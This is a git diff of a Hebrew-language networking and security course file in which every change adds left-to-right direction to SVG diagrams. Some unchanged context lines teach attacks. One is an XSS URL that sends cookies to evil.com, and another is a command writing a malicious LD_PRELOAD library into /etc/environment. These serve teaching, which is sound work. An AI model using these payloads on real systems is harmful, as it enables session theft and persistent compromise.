@@ -46,7 +46,7 @@ export const tracks = [
           <p><strong>תגובה</strong> — <code>Response</code></p>
           <p>השרת משיב בתגובה שמכילה את המידע הדרוש.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 400 140" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 400 140" class="content-diagram">
               <rect x="30" y="20" width="90" height="60" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
               <text x="75" y="50" text-anchor="middle" font-size="12" fill="var(--text)">לקוח</text>
               <text x="75" y="65" text-anchor="middle" font-size="10" fill="var(--text-muted)">(דפדפן)</text>
@@ -109,7 +109,7 @@ export const tracks = [
           <p><strong>כתובות <code>IP</code></strong></p>
           <p>באינטרנט, הכתובות נקראות כתובות <code>IP</code>.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 70" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 70" class="content-diagram">
               <rect x="10" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="45" y="38" text-anchor="middle" font-size="11" fill="var(--text)">בית 1</text>
               <text x="45" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
@@ -526,7 +526,7 @@ server_socket.close()</code></pre>
         title: "מודל חמש השכבות – סקירה",
         content: `
           <div class="diagram-container">
-            <svg viewBox="0 0 280 200" class="content-diagram layers-diagram">
+            <svg direction="ltr" viewBox="0 0 280 200" class="content-diagram layers-diagram">
               <rect x="10" y="10" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="20" y="28" font-size="11" fill="var(--text)">5. אפליקציה</text><text x="200" y="28" font-size="9" fill="var(--text-muted)">HTTP, DNS</text>
               <rect x="10" y="45" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
@@ -611,7 +611,7 @@ server_socket.close()</code></pre>
                 </div>
               </div>
               <div class="lc-viz">
-                <svg viewBox="0 0 200 64" class="lc-svg">
+                <svg direction="ltr" viewBox="0 0 200 64" class="lc-svg">
                   <rect x="4" y="14" width="54" height="36" rx="5" fill="rgba(8,145,178,0.1)" stroke="#0891b2" stroke-width="1.2"/>
                   <text x="31" y="30" text-anchor="middle" font-size="7.5" fill="#0e7490" font-weight="bold">🌐 Browser</text>
                   <text x="31" y="43" text-anchor="middle" font-size="6.5" fill="#0891b2">HTTP Client</text>
@@ -642,7 +642,7 @@ server_socket.close()</code></pre>
                 </div>
               </div>
               <div class="lc-viz">
-                <svg viewBox="0 0 200 64" class="lc-svg">
+                <svg direction="ltr" viewBox="0 0 200 64" class="lc-svg">
                   <rect x="4" y="10" width="58" height="44" rx="5" fill="rgba(124,58,237,0.08)" stroke="#7c3aed" stroke-width="1.2"/>
                   <text x="33" y="26" text-anchor="middle" font-size="7" fill="#6d28d9" font-weight="bold">App Process</text>
                   <text x="33" y="38" text-anchor="middle" font-size="9" fill="#7c3aed" font-weight="bold">:52341</text>
@@ -671,7 +671,7 @@ server_socket.close()</code></pre>
                 </div>
               </div>
               <div class="lc-viz">
-                <svg viewBox="0 0 200 64" class="lc-svg">
+                <svg direction="ltr" viewBox="0 0 200 64" class="lc-svg">
                   <rect x="4" y="18" width="44" height="28" rx="4" fill="rgba(8,145,178,0.1)" stroke="#0891b2" stroke-width="1.1"/>
                   <text x="26" y="31" text-anchor="middle" font-size="6.5" fill="#0e7490" font-weight="bold">PC</text>
                   <text x="26" y="40" text-anchor="middle" font-size="5.8" fill="#0891b2">192.168.1.5</text>
@@ -701,7 +701,7 @@ server_socket.close()</code></pre>
                 </div>
               </div>
               <div class="lc-viz">
-                <svg viewBox="0 0 200 64" class="lc-svg">
+                <svg direction="ltr" viewBox="0 0 200 64" class="lc-svg">
                   <rect x="4" y="18" width="36" height="28" rx="3" fill="rgba(220,38,38,0.08)" stroke="#dc2626" stroke-width="1"/>
                   <text x="22" y="30" text-anchor="middle" font-size="6" fill="#dc2626" font-weight="bold">Preamble</text>
                   <text x="22" y="40" text-anchor="middle" font-size="5.5" fill="#dc2626">8 bytes</text>
@@ -733,7 +733,7 @@ server_socket.close()</code></pre>
                 </div>
               </div>
               <div class="lc-viz">
-                <svg viewBox="0 0 200 64" class="lc-svg">
+                <svg direction="ltr" viewBox="0 0 200 64" class="lc-svg">
                   <line x1="14" y1="32" x2="186" y2="32" stroke="#475569" stroke-width="5" stroke-linecap="round"/>
                   <line x1="14" y1="32" x2="186" y2="32" stroke="rgba(8,145,178,0.35)" stroke-width="3" stroke-linecap="round"/>
                   <circle cx="14" cy="32" r="7" fill="rgba(8,145,178,0.15)" stroke="#0891b2" stroke-width="1.2"/>
@@ -1187,7 +1187,7 @@ packets = sniff(count=10, lfilter=filter_dns)</code></pre>
           <p>מזהה התוכנה על השרת נקרא <strong>פורט</strong>.</p>
           <p>כתובת <code>IP</code> = הבניין, פורט = הדירה. בפניה לפורט מסוים, השרת יודע לאיזו תוכנה פונים.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 320 100" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 320 100" class="content-diagram">
               <rect x="40" y="10" width="120" height="80" rx="6" fill="var(--bg-elevated)" stroke="var(--accent)"/>
               <text x="100" y="35" text-anchor="middle" font-size="11" fill="var(--text)">שרת</text>
               <text x="100" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">IP: 192.168.1.1</text>
@@ -1366,7 +1366,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           <p>ברשת האינטרנט המידע עובר דרך רכיבים רבים — נתבים ושרתים — עד שמגיע ליעד.</p>
           <p>שכבת הרשת דואגת לתהליך ההעברה בין כל הרכיבים האלה.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 360 100" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 360 100" class="content-diagram">
               <rect x="20" y="30" width="50" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="45" y="55" text-anchor="middle" font-size="10">מחשב</text>
               <circle cx="95" cy="50" r="12" fill="var(--accent-green)" stroke="var(--accent)"/>
@@ -1739,7 +1739,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           <p>מחשבים באותו <code>VLAN</code> מתקשרים ביניהם.</p>
           <p>מחשבים ב-<code>VLAN</code>-ים שונים לא יכולים לתקשר ישירות.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 320 140" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 320 140" class="content-diagram">
               <rect x="100" y="60" width="120" height="50" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="160" y="90" text-anchor="middle" font-size="11" fill="var(--text)">Switch</text>
               <rect x="10" y="10" width="70" height="35" rx="4" fill="#3a7a4a" stroke="var(--accent-green)"/>
@@ -1800,7 +1800,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           <p>מבין את תוכן ה-<code>HTTP</code>.</p>
           <p>חוסם התקפות כמו <code>SQL Injection</code>, <code>XSS</code> ועוד.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 80" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 80" class="content-diagram">
               <rect x="10" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="50" y="44" text-anchor="middle" font-size="10">רשת פנימית</text>
               <rect x="130" y="15" width="80" height="50" rx="6" fill="#7a3a3a" stroke="#c06060"/>
@@ -2211,7 +2211,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         content: `
           <p>בשליחת בקשת <code>GET</code>, כל שכבה מוסיפה <code>Header</code>:</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 180" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 180" class="content-diagram">
               <rect x="10" y="5" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="170" y="22" text-anchor="middle" font-size="10" fill="var(--text)">5. Application: HTTP Header + Data (GET / HTTP/2)</text>
               <rect x="10" y="38" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
@@ -2806,7 +2806,7 @@ Addresses: 142.250.185.46</code></pre>
           <p>כל התקשורת מוצפנת מקצה לקצה.</p>
           <p>גם אם מישהו מסנף את הנתונים ברשת, הוא רואה רק מידע מוצפן חסר משמעות.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 80" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 80" class="content-diagram">
               <rect x="10" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="50" y="44" text-anchor="middle" font-size="10">דפדפן</text>
               <rect x="250" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
@@ -2834,7 +2834,7 @@ Addresses: 142.250.185.46</code></pre>
           <p>השיטה מהירה מאוד — האלגוריתם הנפוץ הוא <code>AES</code>.</p>
           <p>הבעיה: איך מעבירים את המפתח לצד השני בלי שמישהו באמצע יתפוס אותו?</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 320 60" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 320 60" class="content-diagram">
               <rect x="10" y="15" width="60" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="40" y="34" text-anchor="middle" font-size="10">Alice</text>
               <rect x="250" y="15" width="60" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
@@ -2886,7 +2886,7 @@ Addresses: 142.250.185.46</code></pre>
           <p>הדפדפן סומך עליהם כי הם מובנים מראש במערכת ההפעלה ובדפדפן.</p>
           <p><strong>שרשרת אמון:</strong></p>
           <div class="diagram-container">
-            <svg viewBox="0 0 300 120" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 300 120" class="content-diagram">
               <rect x="80" y="5" width="140" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="150" y="23" text-anchor="middle" font-size="10">Root CA (מובנה ב-OS)</text>
               <path d="M 150 33 L 150 45" stroke="var(--accent)" stroke-width="2" marker-end="url(#arrowdown)"/>
@@ -3016,7 +3016,7 @@ response = requests.get('https://self-signed.badssl.com', verify=False)</code></
             <tr><td><code>POP3</code></td><td>110 / 995</td><td>קריאת אימייל — מוריד ומוחק מהשרת</td></tr>
           </table>
           <div class="diagram-container">
-            <svg viewBox="0 0 380 100" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 380 100" class="content-diagram">
               <rect x="10" y="30" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="45" y="54" text-anchor="middle" font-size="10">Alice</text>
               <rect x="110" y="20" width="70" height="60" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
@@ -3252,7 +3252,7 @@ ssh.close()</code></pre>
           <p>כל כתובת IP מורכבת מ-<strong>חלק רשת</strong> — <code>Network part</code>, ו-<strong>חלק מארח</strong> — <code>Host part</code>.</p>
           <p>ה-<code>Subnet Mask</code> קובע את הגבול בין שני החלקים.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 60" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 60" class="content-diagram">
               <rect x="10" y="15" width="160" height="30" rx="4" fill="var(--accent-green)" opacity="0.7"/>
               <text x="90" y="34" text-anchor="middle" font-size="11" fill="white">חלק רשת</text>
               <rect x="175" y="15" width="155" height="30" rx="4" fill="var(--accent-gold)" opacity="0.7"/>
@@ -3456,7 +3456,7 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
           <p>128 ביטים = <strong>2<sup>128</sup> ≈ 3.4 × 10<sup>38</sup></strong> כתובות.</p>
           <p>מספיק לתת לכל גרגר חול על כדור הארץ כמה מיליארד כתובות.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 80" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 80" class="content-diagram">
               <rect x="10" y="15" width="130" height="50" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="75" y="38" text-anchor="middle" font-size="11" fill="var(--text)">IPv4</text>
               <text x="75" y="54" text-anchor="middle" font-size="10" fill="var(--text-muted)">32 ביטים</text>
@@ -3662,7 +3662,7 @@ print(net.supernet())  # 192.168.0.0/23</code></pre>
           <p>ה-<code>DNS</code> הוא מסד נתונים <strong>מבוזר והיררכי</strong> — אין שרת אחד שיודע הכל.</p>
           <p>המערכת בנויה משלוש רמות:</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 160" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 160" class="content-diagram">
               <rect x="110" y="5" width="120" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="170" y="24" text-anchor="middle" font-size="11" fill="var(--text)">Root Nameservers (13)</text>
               <line x1="170" y1="35" x2="170" y2="55"/>
@@ -3917,7 +3917,7 @@ sudo dscacheutil -flushcache</code></pre>
           <p>בכל <code>ACK</code>, המקבל מודיע: "יש לי <code>rwnd</code> בתים מקום ב-buffer — שלח עד כאן".</p>
           <p>השולח לא שולח יותר מ-<code>rwnd</code> בתים בכל רגע.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 100" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 100" class="content-diagram">
               <rect x="10" y="20" width="280" height="60" rx="4" fill="var(--bg-elevated)" stroke="var(--accent)"/>
               <rect x="10" y="20" width="100" height="60" rx="0" fill="var(--accent-green)" opacity="0.6"/>
               <rect x="110" y="20" width="80" height="60" rx="0" fill="var(--accent-gold)" opacity="0.6"/>
@@ -3957,7 +3957,7 @@ sudo dscacheutil -flushcache</code></pre>
             <li>ממשיך עד שמגיע ל-<strong>ssthresh</strong> — <code>Slow Start Threshold</code></li>
           </ul>
           <div class="diagram-container">
-            <svg viewBox="0 0 300 120" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 300 120" class="content-diagram">
               <line x1="30" y1="10" x2="30" y2="110" stroke="var(--text-muted)" stroke-width="1.5"/>
               <line x1="30" y1="110" x2="290" y2="110" stroke="var(--text-muted)" stroke-width="1.5"/>
               <text x="18" y="114" font-size="8" fill="var(--text-muted)">0</text>
@@ -4125,7 +4125,7 @@ RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|</code></pre>
           <p>יוצר "מנהרה" מוצפנת בין שתי נקודות דרך רשת ציבורית.</p>
           <p>החיבור נראה כאילו הוא פרטי וישיר, גם אם הוא עובר דרך האינטרנט.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 100" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 100" class="content-diagram">
               <rect x="10" y="30" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="45" y="54" text-anchor="middle" font-size="10">עובד</text>
               <text x="45" y="66" text-anchor="middle" font-size="8" fill="var(--text-muted)">ביתי</text>
@@ -4343,7 +4343,7 @@ Endpoint = peer.example.com:51820</code></pre>
           <p><strong><code>CDN</code></strong> — <code>Content Delivery Network</code></p>
           <p>רשת שרתי "קצה" מפוזרת גלובלית שמגישה תוכן ממקום קרוב.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 120" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 120" class="content-diagram">
               <circle cx="170" cy="60" r="25" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
               <text x="170" y="57" text-anchor="middle" font-size="9">Origin</text>
               <text x="170" y="70" text-anchor="middle" font-size="9">Server</text>
@@ -4487,7 +4487,7 @@ ws.onmessage = (e) => console.log(JSON.parse(e.data))</code></pre>
             <li><strong><code>Microservices</code></strong> — כל פיצ'ר הוא שירות עצמאי. שירותים מתקשרים ביניהם דרך <code>HTTP</code> או <code>gRPC</code></li>
           </ul>
           <div class="diagram-container">
-            <svg viewBox="0 0 340 100" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 340 100" class="content-diagram">
               <rect x="10" y="20" width="100" height="60" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="60" y="50" text-anchor="middle" font-size="10">Monolith</text>
               <text x="60" y="64" text-anchor="middle" font-size="8" fill="var(--text-muted)">All-in-one</text>
@@ -4608,7 +4608,7 @@ ws.onmessage = (e) => console.log(JSON.parse(e.data))</code></pre>
           <p>בצעד תחזוקה שגרתי, מהנדס שינה הגדרות ב-<code>BGP</code> router.</p>
           <p>הפקודה השגויה ביטלה את כל ה-<code>prefix announcements</code> — פייסבוק הסירה את עצמה ממפת האינטרנט.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 380 130" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 380 130" class="content-diagram">
               <rect x="10" y="10" width="80" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="50" y="31" text-anchor="middle" font-size="9">ISP / רשת עולמית</text>
               <rect x="150" y="10" width="80" height="35" rx="4" fill="#fee2e2" stroke="#f87171"/>
@@ -4644,7 +4644,7 @@ ws.onmessage = (e) => console.log(JSON.parse(e.data))</code></pre>
           <p><strong>הנשק:</strong> תולעת בגודל 376 בתים בלבד — קטן מספיק להיכנס בחבילת <code>UDP</code> אחת.</p>
           <p>ניצלה חולשה ידועה ב-Microsoft SQL Server שכבר קיים לה <code>patch</code> מזה 6 חודשים.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 360 110" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 360 110" class="content-diagram">
               <circle cx="180" cy="55" r="8" fill="#dc2626"/>
               <text x="180" y="59" text-anchor="middle" font-size="7" fill="white">0</text>
               <text x="180" y="75" text-anchor="middle" font-size="8">שרת נגוע</text>
@@ -4696,7 +4696,7 @@ ws.onmessage = (e) => console.log(JSON.parse(e.data))</code></pre>
             <li>שעה וחצי של תנועה מסוננת</li>
           </ul>
           <div class="diagram-container">
-            <svg viewBox="0 0 360 90" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 360 90" class="content-diagram">
               <rect x="10" y="25" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="45" y="48" text-anchor="middle" font-size="9">משתמש</text>
               <rect x="280" y="25" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
@@ -4767,7 +4767,7 @@ Why not? → code review checklist didn't include DB review.</code></pre>
             <li><strong>Chaos Kong:</strong> מדמה נפילת Region שלם של AWS</li>
           </ul>
           <div class="diagram-container">
-            <svg viewBox="0 0 360 100" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 360 100" class="content-diagram">
               <rect x="10" y="20" width="75" height="60" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="47" y="48" text-anchor="middle" font-size="9">Service A</text>
               <text x="47" y="60" text-anchor="middle" font-size="8" fill="var(--text-muted)">healthy</text>
@@ -4865,7 +4865,7 @@ Why not? → code review checklist didn't include DB review.</code></pre>
           <p><strong>Open Connect Appliance (<code>OCA</code>)</strong> — Netflix בנתה שרתי <code>cache</code> מיוחדים ומציעה אותם בחינם לספקיות אינטרנט.</p>
           <p>ה-<code>ISP</code> מקבל <code>hardware</code> בחינם. Netflix חוסכת עלויות <code>bandwidth</code>. שני הצדדים מרוויחים.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 360 120" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
               <rect x="10" y="40" width="80" height="40" rx="4" fill="#fee2e2" stroke="#f87171"/>
               <text x="50" y="57" text-anchor="middle" font-size="9">Netflix Origin</text>
               <text x="50" y="69" text-anchor="middle" font-size="8" fill="var(--text-muted)">AWS + נתוני וידאו</text>
@@ -4942,7 +4942,7 @@ vs. Python/Java thread: 8-512MB per thread
             <li>גוגל בנתה <code>hardware</code> משלה — <code>Pluto switches</code> — במקום Cisco או Juniper</li>
           </ul>
           <div class="diagram-container">
-            <svg viewBox="0 0 360 110" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 360 110" class="content-diagram">
               <rect x="20" y="20" width="65" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="52" y="41" text-anchor="middle" font-size="9">DC אמריקה</text>
               <rect x="145" y="10" width="65" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
@@ -5004,7 +5004,7 @@ vs. Python/Java thread: 8-512MB per thread
           <p><strong>מה זה <code>Anycast</code>?</strong></p>
           <p>אותה כתובת <code>IP</code> מוכרזת ממאות מקומות שונים. <code>BGP</code> מנתב כל משתמש לנקודה הקרובה ביותר — אוטומטית.</p>
           <div class="diagram-container">
-            <svg viewBox="0 0 360 110" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 360 110" class="content-diagram">
               <circle cx="180" cy="55" r="20" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="4,2"/>
               <text x="180" y="52" text-anchor="middle" font-size="8" fill="var(--accent)">1.1.1.1</text>
               <text x="180" y="63" text-anchor="middle" font-size="7" fill="var(--text-muted)">Anycast</text>
@@ -5178,7 +5178,7 @@ const fingerprint = canvas.toDataURL()
             <li>Facebook יודעת: היית באתר X בשעה Z</li>
           </ol>
           <div class="diagram-container">
-            <svg viewBox="0 0 360 100" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 360 100" class="content-diagram">
               <rect x="10" y="20" width="70" height="55" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="45" y="42" text-anchor="middle" font-size="9">הדפדפן שלך</text>
               <text x="45" y="57" text-anchor="middle" font-size="8" fill="var(--text-muted)">cookie: fb_uid=X</text>
@@ -5224,7 +5224,7 @@ const fingerprint = canvas.toDataURL()
             <li>Exit node מסיר שכבה שלישית: יודע לאן, לא מי</li>
           </ol>
           <div class="diagram-container">
-            <svg viewBox="0 0 380 90" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 380 90" class="content-diagram">
               <rect x="5" y="28" width="55" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
               <text x="32" y="48" text-anchor="middle" font-size="9">את</text>
               <rect x="80" y="18" width="55" height="55" rx="4" fill="#fef3c7" stroke="#f59e0b"/>
@@ -5345,7 +5345,7 @@ const fingerprint = canvas.toDataURL()
             <tr><td><code>Connection</code> tied to <code>IP:Port</code> — מנותק בשינוי <code>WiFi</code></td><td><code>Connection ID</code> — נשאר connected גם אחרי שינוי <code>IP</code> (<code>roaming</code>)</td></tr>
           </table>
           <div class="diagram-container">
-            <svg viewBox="0 0 360 100" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 360 100" class="content-diagram">
               <rect x="10" y="10" width="155" height="80" rx="6" fill="#fef2f2" stroke="#f87171"/>
               <text x="87" y="28" text-anchor="middle" font-size="9" font-weight="bold" fill="#dc2626">TCP + TLS 1.3</text>
               <text x="87" y="43" text-anchor="middle" font-size="8" fill="#dc2626">RTT 1: SYN → SYN-ACK</text>
@@ -5421,7 +5421,7 @@ int block_udp(struct xdp_md *ctx) {
             <li>ה-traffic יורד ל-<code>ground station</code> ומשם עולה לאינטרנט</li>
           </ul>
           <div class="diagram-container">
-            <svg viewBox="0 0 360 100" class="content-diagram">
+            <svg direction="ltr" viewBox="0 0 360 100" class="content-diagram">
               <ellipse cx="180" cy="90" rx="170" ry="15" fill="var(--accent-soft)" stroke="var(--accent)" opacity="0.5"/>
               <text x="180" y="93" text-anchor="middle" font-size="8">כדור הארץ</text>
               <circle cx="60" cy="30" r="8" fill="#0891b2" stroke="#0e7490"/>
@@ -5571,7 +5571,7 @@ spec:
 <p>לפני שמדברים על כלים ותקיפות, חייבים להבין מה אנחנו מגינים.</p>
 <p>כל בעיית אבטחה ניתנת לסיווג לאחת משלוש קטגוריות.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 150" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 150" class="content-diagram">
   <polygon points="180,15 30,135 330,135" fill="none" stroke="#64748b" stroke-width="2"/>
   <circle cx="180" cy="28" r="22" fill="#7f1d1d" stroke="#ef4444" stroke-width="2"/>
   <text x="180" y="24" text-anchor="middle" font-size="9" fill="#fca5a5" font-weight="bold">Confidentiality</text>
@@ -5665,7 +5665,7 @@ spec:
 <p><strong>הבעיה:</strong> <code>ARP</code> הוא <code>stateless</code> ו-<code>trustless</code>.</p>
 <p>כל מי שנמצא ברשת יכול לשדר "אני 192.168.1.1, ה-MAC שלי הוא XX:XX" — והמכשירים האחרים יאמינו לו.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 140" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 140" class="content-diagram">
   <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">ARP Spoofing — Man in the Middle</text>
   <rect x="10" y="25" width="70" height="25" rx="4" fill="#1e3a5f"/>
   <text x="45" y="41" text-anchor="middle" font-size="10" fill="#7dd3fc">Victim PC</text>
@@ -5870,7 +5870,7 @@ https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+
 <p><code>Pentesting</code> הוא תקיפה מורשית של מערכות מחשב.</p>
 <p>יש <code>scope</code> מוגדר מראש וחוזה משפטי. המטרה: למצוא חולשות לפני שתוקפים אמיתיים ימצאו אותן.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 80" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 80" class="content-diagram">
   <rect x="5" y="20" width="60" height="40" rx="5" fill="#1e3a5f"/>
   <text x="35" y="37" text-anchor="middle" font-size="8" fill="#7dd3fc">1. Recon</text>
   <text x="35" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">מידע פסיבי</text>
@@ -5988,7 +5988,7 @@ run</code></pre></div>
 <p>אסטרטגיית <code>Defense in Depth</code> מבוססת על עיקרון פשוט: אין שכבת הגנה אחת שמספיקה.</p>
 <p>כל שכבה מתוכננת מתוך הנחה שהשכבה שלפניה כבר כשלה.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 150" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 150" class="content-diagram">
   <ellipse cx="180" cy="105" rx="170" ry="40" fill="#0f172a" stroke="#64748b"/>
   <text x="180" y="109" text-anchor="middle" font-size="9" fill="#94a3b8">Physical Security</text>
   <ellipse cx="180" cy="98" rx="145" ry="33" fill="#0f172a" stroke="#475569"/>
@@ -6222,7 +6222,7 @@ print(recovered)  # b'secret data'</code></pre>
 <p>בשלב הראשון משתמשים בהצפנה אסימטרית כדי לסכם מפתח משותף.</p>
 <p>לאחר מכן עוברים להצפנה סימטרית מהירה לתקשורת השוטפת.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 130" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
   <rect x="0" y="0" width="360" height="130" fill="#1e293b"/>
   <rect x="10" y="10" width="70" height="25" rx="4" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
   <text x="45" y="27" text-anchor="middle" font-size="10" fill="#93c5fd" font-weight="bold">Browser</text>
@@ -6497,7 +6497,7 @@ iptables -L -n -v --line-numbers</code></pre>
 <p>שרתים שצריכים להיות נגישים מהאינטרנט יושבים ב-<code>DMZ</code>.</p>
 <p><strong>היתרון:</strong> גם אם שרת ב-<code>DMZ</code> נפרץ — התוקף לא מגיע ישירות לרשת הפנימית.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 130" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
   <rect x="0" y="0" width="360" height="130" fill="#1e293b"/>
   <rect x="5" y="15" width="78" height="100" rx="6" fill="#7f1d1d" stroke="#ef4444" stroke-width="1.5"/>
   <text x="44" y="35" text-anchor="middle" font-size="9" fill="#fca5a5" font-weight="bold">Internet</text>
@@ -7186,7 +7186,7 @@ echo "LD_PRELOAD=/tmp/malicious.so" >> /etc/environment</code></pre></div>
 <p>העץ כולו מתחיל בשורש אחד — <code>/</code>.</p>
 <p>כל רכיב במערכת — דיסקים, מכשירים, תהליכים — מיוצג כקובץ.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 120" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
   <text x="175" y="18" text-anchor="middle" font-size="13" fill="#e2e8f0" font-weight="bold">/</text>
   <line x1="175" y1="22" x2="40" y2="45" stroke="#64748b" stroke-width="1.5"/>
   <line x1="175" y1="22" x2="105" y2="45" stroke="#64748b" stroke-width="1.5"/>
@@ -7281,7 +7281,7 @@ du -sh /var/log/* | sort -rh | head -10</code></pre></div>
 <p>כל קובץ שייך ל<strong>משתמש</strong> ול<strong>קבוצה</strong>.</p>
 <p>לכל קובץ יש 3 סטי הרשאות:</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 120" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
   <rect x="10" y="15" width="340" height="40" rx="6" fill="#1e293b"/>
   <text x="20" y="40" font-size="16" fill="#f1f5f9" font-family="monospace">-  rwx  r-x  r--</text>
   <text x="22" y="58" font-size="9" fill="#94a3b8">סוג</text>
@@ -7383,7 +7383,7 @@ sudo systemctl start myapp</code></pre></div>
 <p>לפני <code>Docker</code>, כל אפליקציה הצריכה <code>VM</code> שלמה — גרעין, <code>OS</code> מלא, <code>RAM</code> נפרד.</p>
 <p>הבזבוז היה עצום.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 120" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
   <rect x="5" y="5" width="165" height="110" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
